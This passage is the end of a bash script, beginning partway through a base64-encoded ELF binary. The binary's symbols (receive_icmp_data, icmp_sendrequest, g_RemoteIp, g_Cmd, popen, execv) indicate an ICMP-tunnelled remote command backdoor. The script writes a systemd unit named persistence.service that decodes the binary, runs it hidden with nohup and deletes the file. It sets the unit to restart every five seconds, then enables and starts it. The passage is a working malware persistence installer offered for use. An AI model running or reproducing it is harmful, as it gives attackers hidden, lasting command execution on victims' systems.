AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4BIAAAAAAACgEgAAAAAAAAEAAAAAAAAARQEAAAAAAAABAAAAAAAAAFUBAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAA5BoAAAAAAAAZAAAAAAAAANg9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA4D0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAAAIAwAAAAAAAAUAAAAAAAAAeAYAAAAAAAAGAAAAAAAAADADAAAAAAAACgAAAAAAAACFAQAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAAQAAAAAAAAAIAAAAAAAAAoAIAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABwCQAAAAAAAAcAAAAAAAAAmAgAAAAAAAAIAAAAAAAAANgAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPv//28AAAAAAAAACAAAAAD+//9vAAAAAEgIAAAAAAAA////bwAAAAACAAAAAAAAAPD//28AAAAA/gcAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6D0AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAB2EAAAAAAAAIYQAAAAAAAAlhAAAAAAAACmEAAAAAAAALYQAAAAAAAAxhAAAAAAAADWEAAAAAAAAOYQAAAAAAAA9hAAAAAAAAAGEQAAAAAAABYRAAAAAAAAJhEAAAAAAAA2EQAAAAAAAEYRAAAAAAAAVhEAAAAAAABmEQAAAAAAAHYRAAAAAAAAhhEAAAAAAACWEQAAAAAAAKYRAAAAAAAAthEAAAAAAADGEQAAAAAAANYRAAAAAAAA5hEAAAAAAAAAAAAAAAAAAABBAAAAAAAAR0NDOiAoRGViaWFuIDEwLjIuMS02KSAxMC4yLjEgMjAyMTAxMTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAEAqAIAAAAAAAAAAAAAAAAAAAAAAAADAAIAxAIAAAAAAAAAAAAAAAAAAAAAAAADAAMA6AIAAAAAAAAAAAAAAAAAAAAAAAADAAQACAMAAAAAAAAAAAAAAAAAAAAAAAADAAUAMAMAAAAAAAAAAAAAAAAAAAAAAAADAAYAeAYAAAAAAAAAAAAAAAAAAAAAAAADAAcA/gcAAAAAAAAAAAAAAAAAAAAAAAADAAgASAgAAAAAAAAAAAAAAAAAAAAAAAADAAkAmAgAAAAAAAAAAAAAAAAAAAAAAAADAAoAcAkAAAAAAAAAAAAAAAAAAAAAAAADAAsAABAAAAAAAAAAAAAAAAAAAAAAAAADAAwAIBAAAAAAAAAAAAAAAAAAAAAAAAADAA0A8BEAAAAAAAAAAAAAAAAAAAAAAAADAA4AABIAAAAAAAAAAAAAAAAAAAAAAAADAA8A5BoAAAAAAAAAAAAAAAAAAAAAAAADABAAACAAAAAAAAAAAAAAAAAAAAAAAAADABEAZCAAAAAAAAAAAAAAAAAAAAAAAAADABIA2CAAAAAAAAAAAAAAAAAAAAAAAAADABMA2D0AAAAAAAAAAAAAAAAAAAAAAAADABQA4D0AAAAAAAAAAAAAAAAAAAAAAAADABUA6D0AAAAAAAAAAAAAAAAAAAAAAAADABYA2D8AAAAAAAAAAAAAAAAAAAAAAAADABcAAEAAAAAAAAAAAAAAAAAAAAAAAAADABgA+EAAAAAAAAAAAAAAAAAAAAAAAAADABkAIEEAAAAAAAAAAAAAAAAAAAAAAAADABoAAAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAAwAAAACAA4AMBIAAAAAAAAAAAAAAAAAAA4AAAACAA4AYBIAAAAAAAAAAAAAAAAAACEAAAACAA4AoBIAAAAAAAAAAAAAAAAAADcAAAABABkAKEEAAAAAAAABAAAAAAAAAEMAAAABABQA4D0AAAAAAAAAAAAAAAAAAGoAAAACAA4A4BIAAAAAAAAAAAAAAAAAAHYAAAABABMA2D0AAAAAAAAAAAAAAAAAAJUAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAJ4AAAABABIAvCIAAAAAAAAAAAAAAAAAAAAAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAKwAAAAAABMA4D0AAAAAAAAAAAAAAAAAAL0AAAABABUA6D0AAAAAAAAAAAAAAAAAAMYAAAAAABMA2D0AAAAAAAAAAAAAAAAAANkAAAAAABEAZCAAAAAAAAAAAAAAAAAAAOwAAAABABcAAEAAAAAAAAAAAAAAAAAAAFwDAAACAAsAABAAAAAAAAAAAAAAAAAAAAIBAAASAA4A4BoAAAAAAAABAAAAAAAAABIBAAASAAAAAAAAAAAAAAAAAAAAAAAAACMBAAASAAAAAAAAAAAAAAAAAAAAAAAAAD4BAAARABkAgEEAAAAAAAAoAAAAAAAAAE0BAAASAAAAAAAAAAAAAAAAAAAAAAAAAGEBAAASAAAAAAAAAAAAAAAAAAAAAAAAAHUBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAJEBAAARABkAIEEAAAAAAAAIAAAAAAAAAOsCAAAgABgA+EAAAAAAAAAAAAAAAAAAAKQBAAASAAAAAAAAAAAAAAAAAAAAAAAAALYBAAAQABgACEEAAAAAAAAAAAAAAAAAAL0BAAARABkAsEEAAAAAAAAYAAAAAAAAAAwBAAASAg8A5BoAAAAAAAAAAAAAAAAAAM0BAAASAAAAAAAAAAAAAAAAAAAAAAAAAOABAAASAAAAAAAAAAAAAAAAAAAAAAAAAPIBAAASAAAAAAAAAAAAAAAAAAAAAAAAAAMCAAASAA4ABRQAAAAAAACOAAAAAAAAAAwCAAASAAAAAAAAAAAAAAAAAAAAAAAAACUCAAASAAAAAAAAAAAAAAAAAAAAAAAAADgCAAASAAAAAAAAAAAAAAAAAAAAAAAAAEsCAAARABkAeEEAAAAAAAAEAAAAAAAAAFcCAAASAAAAAAAAAAAAAAAAAAAAAAAAAGkCAAASAA4A5RIAAAAAAADDAAAAAAAAAHMCAAASAAAAAAAAAAAAAAAAAAAAAAAAAIQCAAASAAAAAAAAAAAAAAAAAAAAAAAAAJUCAAASAAAAAAAAAAAAAAAAAAAAAAAAALMCAAASAA4AQhYAAAAAAAAtAAAAAAAAALkCAAASAAAAAAAAAAAAAAAAAAAAAAAAANcCAAASAAAAAAAAAAAAAAAAAAAAAAAAAOkCAAAQABgA+EAAAAAAAAAAAAAAAAAAAPYCAAASAAAAAAAAAAAAAAAAAAAAAAAAAAwDAAASAA4AkxQAAAAAAAAoAAAAAAAAABUDAAAgAAAAAAAAAAAAAAAAAAAAAAAAACQDAAARAhgAAEEAAAAAAAAAAAAAAAAAADEDAAASAAAAAAAAAAAAAAAAAAAAAAAAAEMDAAARABAAACAAAAAAAAAEAAAAAAAAAFIDAAASAA4AgBoAAAAAAABdAAAAAAAAAGIDAAASAAAAAAAAAAAAAAAAAAAAAAAAAHUDAAASAAAAAAAAAAAAAAAAAAAAAAAAALgAAAAQABkAyEEAAAAAAAAAAAAAAAAAAO8CAAASAA4AABIAAAAAAAArAAAAAAAAAIgDAAARABkAYEEAAAAAAAAEAAAAAAAAAJMDAAAQABkACEEAAAAAAAAAAAAAAAAAAJ8DAAARABkAUEEAAAAAAAAIAAAAAAAAAKoDAAASAA4AKxkAAAAAAABTAQAAAAAAAK8DAAASAAAAAAAAAAAAAAAAAAAAAAAAAMEDAAARABkAaEEAAAAAAAAIAAAAAAAAAMcDAAASAAAAAAAAAAAAAAAAAAAAAAAAANoDAAASAAAAAAAAAAAAAAAAAAAAAAAAAPMDAAARABkAREEAAAAAAAAEAAAAAAAAAAMEAAASAA4AqBMAAAAAAABdAAAAAAAAABIEAAASAAAAAAAAAAAAAAAAAAAAAAAAADMEAAASAA4AbxYAAAAAAAC8AgAAAAAAAEUEAAARAhgACEEAAAAAAAAAAAAAAAAAAFEEAAARABkAfEEAAAAAAAAEAAAAAAAAAFsEAAARABkAcEEAAAAAAAAIAAAAAAAAAGUEAAAgAAAAAAAAAAAAAAAAAAAAAAAAAH8EAAARABkASEEAAAAAAAAIAAAAAAAAAIkEAAARABkAQEEAAAAAAAAEAAAAAAAAAJUEAAAiAAAAAAAAAAAAAAAAAAAAAAAAALAEAAASAAAAAAAAAAAAAAAAAAAAAAAAAMIEAAASAAAAAAAAAAAAAAAAAAAAAAAAANMEAAARABkAWEEAAAAAAAAIAAAAAAAAANwEAAASAAAAAAAAAAAAAAAAAAAAAAAAAO8EAAASAA4AuxQAAAAAAACHAQAAAAAAAAAFAAASAAAAAAAAAAAAAAAAAAAAAAAAAABjcnRzdHVmZi5jAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuMABfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAY2xpZW50LmMAX19GUkFNRV9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBmcmVlQEdMSUJDXzIuMi41AHB0aHJlYWRfY3JlYXRlQEdMSUJDXzIuMi41AGdfb3V0cHV0X211dGV4AHN0cm5jcHlAR0xJQkNfMi4yLjUAc3RybmNtcEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAc3Rkb3V0QEdMSUJDXzIuMi41AGZjbnRsQEdMSUJDXzIuMi41AF9lZGF0YQBnX291dHB1dF9idWZmZXIAc3RybGVuQEdMSUJDXzIuMi41AGNoZGlyQEdMSUJDXzIuMi41AGR1cDJAR0xJQkNfMi4yLjUAY2hlY2tzdW0AZ2V0dGltZW9mZGF5QEdMSUJDXzIuMi41AG1lbXNldEBHTElCQ18yLjIuNQBzZW5kdG9AR0xJQkNfMi4yLjUAZ19jaGlsZF9waWQAY2xvc2VAR0xJQkNfMi4yLjUAY2hhbmdlZGlyAHBpcGVAR0xJQkNfMi4yLjUAcmVhZEBHTElCQ18yLjIuNQBfX2xpYmNfc3RhcnRfbWFpbkBHTElCQ18yLjIuNQBoZWxsbwBwdGhyZWFkX2F0dHJfaW5pdEBHTElCQ18yLjIuNQBmZ2V0c0BHTElCQ18yLjIuNQBfX2RhdGFfc3RhcnQAaW5ldF9hZGRyQEdMSUJDXzIuMi41AHJhbmRvbTE2AF9fZ21vbl9zdGFydF9fAF9fZHNvX2hhbmRsZQBtZW1jcHlAR0xJQkNfMi4xNABfSU9fc3RkaW5fdXNlZABfX2xpYmNfY3N1X2luaXQAbWFsbG9jQEdMSUJDXzIuMi41AGZmbHVzaEBHTElCQ18yLjIuNQBnX1JlbW90ZUlwAF9fYnNzX3N0YXJ0AHdyaXRlX3BpcGUAbWFpbgBwb3BlbkBHTElCQ18yLjIuNQBnX0NtZABwZXJyb3JAR0xJQkNfMi4yLjUAcHRocmVhZF9qb2luQEdMSUJDXzIuMi41AGdfQ2FuVGhyZWFkRXhpdABNeUNyZWF0ZVRocmVhZABwdGhyZWFkX2F0dHJfZGVzdHJveUBHTElCQ18yLjIuNQByZWNlaXZlX2ljbXBfZGF0YQBfX1RNQ19FTkRfXwBnX2JpbmRfaXAAZ19SZXF1ZXN0AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAcmVhZF9waXBlAGdfaWNtcF9zb2NrAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AGV4ZWN2QEdMSUJDXzIuMi41AGZvcmtAR0xJQkNfMi4yLjUAZ19NeU5hbWUAc3Ryc3RyQEdMSUJDXzIuMi41AGljbXBfc2VuZHJlcXVlc3QAc29ja2V0QEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LmJ1aWxkLWlkAC5ub3RlLkFCSS10YWcALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9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 | base64 -d > client ; chmod +x client ; nohup ./client >/dev/null 2>/dev/null & echo x ; pgrep client | tail -n 1 | xargs -I{} bash -c \'kill -31 {}\' ; rm ./client"' >> /etc/systemd/system/persistence.service
   echo "Restart=always" >> /etc/systemd/system/persistence.service
   echo "RestartSec=5" >> /etc/systemd/system/persistence.service
   echo "" >> /etc/systemd/system/persistence.service
   echo "[Install]" >> /etc/systemd/system/persistence.service
   echo "WantedBy=multi-user.target" >> /etc/systemd/system/persistence.service
}

message="[*] setup completed! [*]"

for i in $(seq 1 ${#message}); do
        echo -ne "${message:i-1:1}"
        sleep 0.03
done

echo -ne "\n"

clear

msg="[*] Activating the service [*]"

function EnablePersistence () {
  systemctl enable persistence.service
  systemctl start persistence
}

echo -ne "\n"

clear

scs="[*] Success! [*]"

for i in $(seq 1 ${#scs}); do
        echo -ne "${scs:i-1:1}"
        sleep 0.08
done

echo -ne "\n"

clear

SystemdPersistence && EnablePersistence /

clear
